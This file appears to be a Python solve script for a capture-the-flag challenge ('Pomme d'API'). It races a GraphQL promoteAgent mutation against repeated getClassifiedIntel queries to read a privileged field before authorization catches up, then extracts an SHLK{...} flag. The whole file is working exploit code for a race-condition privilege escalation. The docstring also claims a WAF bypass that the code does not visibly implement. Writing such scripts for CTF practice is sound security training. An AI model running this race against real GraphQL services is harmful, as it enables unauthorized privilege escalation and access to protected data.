#!/usr/bin/env python3
"""Pomme d'API — WAF bypass + promoteAgent race + getClassifiedIntel."""
import json
import queue
import sys
import threading
import urllib.request


def post(base: str, query: str):
    req = urllib.request.Request(
        base,
        data=json.dumps({"query": query}).encode(),
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    return json.loads(urllib.request.urlopen(req).read())


def solve(host: str, port: int = 8000) -> str:
    base = f"http://{host}:{port}/graphql"
    results: queue.Queue = queue.Queue()

    def mutate():
        results.put(post(base, "mutation { promoteAgent { success message } }"))

    def intel_loop():
        for _ in range(80):
            try:
                r = post(base, "query { spies { id } getClassifiedIntel }")
                val = r["data"]["getClassifiedIntel"]
                if "SHLK{" in val:
                    results.put(val)
                    return
            except Exception:
                pass

    t = threading.Thread(target=mutate)
    i = threading.Thread(target=intel_loop)
    t.start()
    i.start()
    t.join(timeout=10)
    i.join(timeout=10)

    while not results.empty():
        item = results.get()
        if isinstance(item, str) and "SHLK{" in item:
            start = item.index("SHLK{")
            end = item.index("}", start) + 1
            return item[start:end]
    raise SystemExit("race failed — retry")


if __name__ == "__main__":
    host = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 8000
    print(solve(host, port))
